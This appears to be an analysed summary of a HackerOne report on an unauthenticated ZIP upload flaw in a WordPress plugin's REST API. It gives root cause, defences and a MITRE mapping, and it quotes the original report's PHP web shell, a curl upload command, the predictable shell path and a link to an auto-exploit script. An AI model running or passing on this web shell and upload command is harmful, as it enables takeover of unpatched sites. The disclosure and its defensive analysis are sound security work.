# WordPress Plugin Insert or Embed Articulate Content into WordPress Remote Code Execution

## Metadata
- **Source:** HackerOne
- **Report:** 696198 | https://hackerone.com/reports/696198
- **Submitted:** 2019-09-17
- **Reporter:** j4tayu
- **Program:** HackerOne
- **Bounty:** Not specified in writeup
- **Severity:** CRITICAL
- **Vuln:** Arbitrary File Upload, Remote Code Execution, Improper Input Validation, Authentication Bypass
- **CVEs:** None
- **Category:** web-api

## Summary
The Articulate Content plugin for WordPress contains an unauthenticated file upload vulnerability in the REST API endpoint /wp-json/articulate/v1/upload-data that allows attackers to upload arbitrary files including PHP scripts. Attackers can upload a ZIP containing executable PHP code, which is then extracted and accessible at a predictable path, enabling remote code execution.

## Attack scenario
1. Attacker creates a malicious ZIP file containing index.php with system command execution code
2. Attacker sends POST request to /wp-json/articulate/v1/upload-data endpoint with crafted file upload parameters
3. Plugin processes upload without proper authentication or file type validation
4. ZIP file is extracted to wp-content/uploads/articulate_uploads/ directory with predictable naming
5. Attacker accesses the uploaded PHP file at the predictable path (e.g., /wp-content/uploads/articulate_uploads/kntl17/index.php)
6. PHP code executes server-side, allowing arbitrary command execution through GET parameter injection

## Root cause
The plugin's REST API endpoint lacks proper authentication checks, file type validation, and zip extraction security controls. It accepts and extracts arbitrary ZIP files to a web-accessible directory without verifying content or implementing access restrictions.

## Attacker mindset
Low-skill exploitation targeting unpatched WordPress installations. The vulnerability is trivial to exploit using basic curl commands, requiring no authentication or special techniques. Attackers seek quick RCE on WordPress sites for malware distribution or site compromise.

## Defensive takeaways
- Implement mandatory authentication/authorization checks on all REST API endpoints, especially upload handlers
- Validate file types strictly (whitelist approach) and verify file contents match declared types
- Disable PHP execution in upload directories via .htaccess or web server configuration
- Sanitize and randomize file paths; avoid predictable directory structures for uploaded content
- Implement file size limits and scan uploaded files with antivirus/static analysis
- Use a dedicated, non-web-accessible storage location for uploads when possible
- Add nonce verification for sensitive operations and rate-limit upload endpoints
- Regularly audit plugin code for authentication bypass vulnerabilities

## Variant hunting
Check other WordPress plugins with REST API file upload endpoints for missing authentication
Search for plugins using zip extraction functions without content validation
Audit plugins that store uploads in web-accessible directories without execution prevention
Review similar content delivery/media plugins for zip handling vulnerabilities
Test multipart form upload endpoints across plugins for missing permission checks

## MITRE ATT&CK
- T1190 - Exploit Public-Facing Application
- T1200 - Hardware Additions
- T1105 - Ingress Tool Transfer
- T1059 - Command and Scripting Interpreter
- T1570 - Lateral Tool Transfer

## Notes
This is a classic file upload RCE vulnerability with trivial exploitation. The writeup quality is poor (lacks technical depth and HackerOne metadata), but the vulnerability is severe. The plugin fails on multiple security layers: authentication, file validation, and execution prevention. Likely affects many unpatched WordPress installations. The Pastebin autosploit reference indicates weaponized PoC exists in the wild.

## Full report
<details><summary>Expand</summary>

because in the burp suite, the build request is complicated, I only use curl
1. Create file index.html and index.php

Index.html : 
<html>
Hello world
</html>

Index.php :
<?php
system($_GET[cmd]);
?>

2. Once created enter into .zip (COMPRESS)
3.  LETS UPLOAD
CURL :
curl site.com/index.php/wp-json/articulate/v1/upload-data -F "name={NAMAFILE}" -F "chunk={RANDOM}" -F "chunks={RANDOM}" -F "file=@YOURFILE.zip"
4. OK HERE, THERE IS A READING UPLOAD COMPLETE which means success
we try access to
site.com/PATH/ <PATH = PATH AT RESULT EX: site.com/wp-content/uploads/articulate_uploads/kntl17/index.php

For the autoxploiter https://pastebin.com/BEy5iDLA

## Impact

Remote code execution

</details>

---
*Analysed by Claude on 2026-05-12*
